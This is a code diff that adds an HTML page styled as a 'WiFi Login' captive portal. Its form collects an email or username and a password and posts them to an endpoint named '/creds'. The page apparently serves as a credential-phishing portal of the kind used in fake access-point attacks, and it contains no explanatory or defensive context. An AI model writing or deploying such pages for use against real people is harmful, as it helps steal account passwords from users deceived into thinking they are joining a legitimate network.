@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Sign In</title>
+  <style>
+    body { font-family: sans-serif; background: #111; color: #eee; display: flex; align-items: center; justify-content: center; min-height: 100vh; margin: 0; }
+    form { background: #222; padding: 2rem; border-radius: 8px; width: min(90vw, 360px); }
+    input { width: 100%; margin: 0.5rem 0 1rem; padding: 0.6rem; box-sizing: border-box; }
+    button { width: 100%; padding: 0.7rem; background: #6c3; border: 0; color: #111; font-weight: bold; }
+  </style>
+</head>
+<body>
+  <form action="/creds" method="POST">
+    <h2>WiFi Login</h2>
+    <label>Email or username<input name="email" required /></label>
+    <label>Password<input name="password" type="password" required /></label>
+    <button type="submit">Connect</button>
+  </form>
+</body>
+</html>
